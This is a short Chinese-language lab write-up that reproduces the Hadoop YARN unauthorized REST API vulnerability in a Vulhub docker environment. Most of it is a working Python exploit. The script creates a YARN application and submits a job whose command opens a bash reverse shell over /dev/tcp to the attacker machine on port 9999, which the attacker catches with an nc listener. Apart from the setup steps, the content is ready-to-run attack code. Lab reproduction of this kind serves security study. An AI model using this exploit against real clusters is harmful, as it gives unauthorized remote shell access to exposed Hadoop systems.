靶场搭建:


靶机：本地
IP: 127.0.0.1

攻击机：kali
IP: 192.168.253.128

首先使用docker搭建环境

到Vulnhub目录下hadoop\unauthorized-yarn

docker-compose up -d

漏洞复现:

原理是通过REST API提交任务执行
申请新的application：http://yourip:8088/ws/v1/cluster/apps/new-application


首先访问本地ip:8088端口即可看到Hadoop页面



先在攻击机监听9999端口等待反弹 shell 连接

查看kali ip


再kali上打开nc监听端口



Exp:

import requeststarget = 'http://127.0.0.1:8088/'lhost = '192.168.253.128'url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)



修改lhost为攻击机ip

运行脚本，获取shell

python exp.py
